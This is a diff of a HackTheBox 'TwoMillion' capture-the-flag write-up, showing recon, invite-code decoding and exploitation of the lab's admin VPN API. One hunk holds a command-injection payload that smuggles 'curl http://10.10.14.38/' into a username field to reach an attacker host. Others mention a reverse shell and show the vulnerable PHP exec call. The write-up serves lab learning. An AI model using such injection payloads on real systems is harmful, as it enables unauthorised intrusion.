@@ -11,6 +11,7 @@ author: trace
 ## Machine Information
 
 ---
+
 - Alias: TwoMillion
 - Date: 07 June 2023
 - Platform: HackTheBox
@@ -33,27 +34,23 @@ author: trace
 8. Additionally, an email is discovered in the admin's inbox, which reveals information about a vulnerability in the OverlayFS of the Linux kernel.
 9. Exploiting this vulnerability, the hacker successfully obtains root access.
 
-
 ## Tools
 
+| Purpose                | Tools                                                                                          |
+|:---------------------- |:---------------------------------------------------------------------------------------------- |
+| Port Scanning          | [`nmap`](https://nmap.org/)                                                                    |
+| SSH Enumeration        | [`ssh-audit`](https://github.com/jtesta/ssh-audit)                                             |
+| Directory Bruteforcing | [`ffuf`](https://github.com/ffuf/ffuf)                                                         |
+| Web Crawler            | [`katana`](https://github.com/projectdiscovery/katana)                                         |
+| Proxy                  | [`Burpsuite`](https://portswigger.net/burp/communitydownload)                                  |
+| API Testing            | [`curl`](https://curl.se/) [`Postman`](https://www.postman.com/)                               |
+| Reverse Shell          | [`nc`](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/) |
 
-| Purpose                           | Tools                                       |
-|:----------------------------------|:--------------------------------------------|
-| Port Scanning                     | [`nmap`](https://nmap.org/)                                       |
-| SSH Enumeration                   | [`ssh-audit`](https://github.com/jtesta/ssh-audit)                                   |
-| Directory Bruteforcing            | [`ffuf`](https://github.com/ffuf/ffuf)                                       |
-| Web Crawler                       | [`katana`](https://github.com/projectdiscovery/katana)                                     |
-| Proxy                             | [`Burpsuite`](https://portswigger.net/burp/communitydownload)                                   |
-| API Testing  | [`curl`](https://curl.se/) [`Postman`](https://www.postman.com/)                                                  |
-| Reverse Shell                     | [`nc`](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)                                          |
-
-
-## Information Gathering 
+## Information Gathering
 
 ### Port Scanning
 
 Scanning for all opened ports:
-
 
 ```
 $ nmap -sS -oN nmap.txt 10.10.11.221
@@ -67,10 +64,8 @@ PORT   STATE SERVICE
 
 ### HTTP (Nginx/2million.htb)
 
-
 After accessing the `10.10.11.221:80` and adding `2million.htb` to our `/etc/hosts`, we got to the old school Hack The Box portal:
 
-<img src="/assets/writeups/2023-06-10-twomillion/website.png" width=800px alt="HackTheBox old portal" title="The good old days!">
 
 
 #### Crawling
@@ -79,16 +74,15 @@ Exploring the website, we discover a `invite` and `login` page.
 
 Crawling all the links on the website, we don't find much more information:[^1]
 
-
 ```
 # katana -u http://2million.htb/
 
    __        __
   / /_____ _/ /____ ____  ___ _
  /  '_/ _  / __/ _  / _ \/ _  /
-/_/\_\\_,_/\__/\_,_/_//_/\_,_/							
+/_/\_\\_,_/\__/\_,_/_//_/\_,_/                            
 
-		projectdiscovery.io
+        projectdiscovery.io
 
 [INF] Current katana version v1.0.1 (latest)
 [INF] Started standard crawling for => http://2million.htb/
@@ -102,28 +96,27 @@ http://2million.htb/js/htb-frontend.min.js
 http://2million.htb/css/htb-frontend.css
 ```
 
-
 #### Invite Code
 
 Checking the `/invite` page, the server asks for a invite code and challenges us to hack our way in.
 
-<img src="/assets/writeups/2023-06-10-twomillion/invite_page.png" width=500px alt="Invite field" title="Is this a challenge?">
+
 
 Challenge accepted. 
 
 After clicking in the "Sign Up" button, the page requests the `/api/v1/invite/verify` endpoint, with the code inserted on the body of the `POST` request. I've tested some SQLI inputs, but nothing worked:[^2]
 
-<img src="/assets/writeups/2023-06-10-twomillion/invite.png" width=800px alt="Burpsuite in repeater with the invite code request" title="Testing for SQLI with Burpsuite">
+
 
 Checking the source code of the page, we find a script in the HTML which does the request. If the code is valid, the user is redirected to the `/register` with the cookie `inviteCode` set:
 
-<img src="/assets/writeups/2023-06-10-twomillion/register-route.png" width=800px alt="Register redirect in /invite">
+
 
 #### Register
 
 Loading the page, the `inviteapi.min.js` obfuscated script is called. This code calls the `eval` function, which executes Javascript code. 
 
-<img src="/assets/writeups/2023-06-10-twomillion/eval.png" width=800px alt="Javascript obfuscated function">
+
 
 At first glance, I've tried to de-obfuscate this code by hand in my own machine, but there's a clever way to see what it does: replace the `eval` with the `console.log`. This allow us to see what's inside the `eval` and, therefore, what's being executed in our browser:
 
@@ -138,7 +131,7 @@ function verifyInviteCode(code) {
   var formData = {"code":code};
   $.ajax(
     {
-	  type:"POST",
+      type:"POST",
       dataType:"json",
       data:formData,url:'/api/v1/invite/verify',
       success: function(response){ console.log(response) },
@@ -154,13 +147,13 @@ function makeInviteCode() {
     success:function(response){console.log(response)},
     error:function(response){console.log(response)}})
 }
-``` 
+```
 
 We have two functions: `verifyInviteCode` and `makeInviteCode`. Both of them query the API and logs the response on the console. The first one requests the `invite/verify` route; the second one, `invite/how/to/generate`.
 
 Calling `makeInviteCode` from the browser console, we get a json object:
 
-<img src="/assets/writeups/2023-06-10-twomillion/encrypted.png" width=800px alt="'Encrypted' json object">
+
 
 This object have three properties: data, hint and success. Hint tells us that the data property is encrypted. Data have the data itself and a enctype field, set to "ROT13". [Decrypting it](https://rot13.com/), we get: 
 
@@ -180,12 +173,12 @@ And here's our invite code!
 
 ```json
 {
-	"0": 200,
-	"success": 1,
-	"data": {
-		"code":"SEdWOUEtMlhGQzEtSlZaUkotWERUOFk=",
-		"format":"encoded"
-	}
+    "0": 200,
+    "success": 1,
+    "data": {
+        "code":"SEdWOUEtMlhGQzEtSlZaUkotWERUOFk=",
+        "format":"encoded"
+    }
 }
 ```
 
@@ -277,7 +270,7 @@ Requesting the `/api/v1` route, we can see all the available routes:
 curl "http://2million.htb/api/v1" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte"
 ```
 
-<img src="/assets/writeups/2023-06-10-twomillion/api-endpoints.png" width=600px alt="API endpoints">
+
 
 Interesting. This API has a `admin` section that contains three routes: `/auth`, `/vpn/generate`, and `/settings/update`. Let's try it!
 
@@ -421,7 +414,7 @@ sudo php -S 0.0.0.0:80
 curl "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json" -d '{"username":"tandera; curl http://10.10.14.38/"}'
 ```
 
-<img src="/assets/writeups/2023-06-10-twomillion/code_injection.png" width=800px alt="Our little injection.">
+
 
 Here it is! The server have executed our `curl` command. Through this technique, we can get a reverse shell:
 
@@ -442,6 +435,7 @@ curl "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=877le0d
 ### Local Enumeration (www-data)
 
 ---
+
 - id: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 - system: `Ubuntu 22.04.2 LTS`
 - users: `root`, `www-data` and `admin`
@@ -454,7 +448,7 @@ Our shell spawns on the default directory for the Apache server, `/var/www/html/
 
 ```php
 class Database {
-	// ...
+    // ...
     private static $database = null;
     public function __construct($host, $user, $pass, $dbName) {/* ... */}
 
@@ -504,6 +498,7 @@ And, coincidence or not, this is also de credentials for the `admin` user!
 ### Local Enumeration (admin)
 
 ---
+
 - id: `uid=1000(admin) gid=1000(admin) groups=1000(admin)`
 - sudo: `not for admin`
 
@@ -595,13 +590,13 @@ In the `VPN` folder, we can find a shell script called `gen.sh`.
 username=$1
 
 if [[ -n "$username" ]]; then
-	cd /var/www/html/VPN
+    cd /var/www/html/VPN
 
-	/usr/bin/cp user/user.cnf user/"$username".cnf
-	/usr/bin/sed -i "s/username/$username/g" user/"$username".cnf
+    /usr/bin/cp user/user.cnf user/"$username".cnf
+    /usr/bin/sed -i "s/username/$username/g" user/"$username".cnf
 
-	/usr/bin/openssl req -config user/"$username".cnf -newkey rsa:2048 -sha256 -nodes -out user/"$username".csr -outform PEM
-	# ...
+    /usr/bin/openssl req -config user/"$username".cnf -newkey rsa:2048 -sha256 -nodes -out user/"$username".csr -outform PEM
+    # ...
 ```
 
 This script receives only one argument, which is the `username`. Let's search for code who uses this file:
@@ -621,8 +616,8 @@ Checking the `VPNController.php` :
 ```php
 public function regenerate_user_vpn($router, $user = null) {
   if ($user != null) {
-	exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);
-	// ...
+    exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);
+    // ...
 ```
 
 Here it is: whenever the server calls the `regenerate_user_vpn` method, the `$user` variable is passed as is. I.e., when we send our payload to the server, the code will execute the statement (and our malicious code):
@@ -632,6 +627,7 @@ Here it is: whenever the server calls the `regenerate_user_vpn` method, the `$us
 ```
 
 ---
+
 [^1]: It's possible to bruteforce directories too, but all links are available through crawling and javascript analysis. If you want to **speed things up**, use the `-jc/-js-crawl` option in katana. 
 [^2]: The responses are always equal to the "Invalid Code" response, even with Boolean Based techniques. 
 [^3]: The `ovpn` file contains a subdomain to connect: `edge-eu-free-1.2million.htb`, on port 1337. This port is closed. 
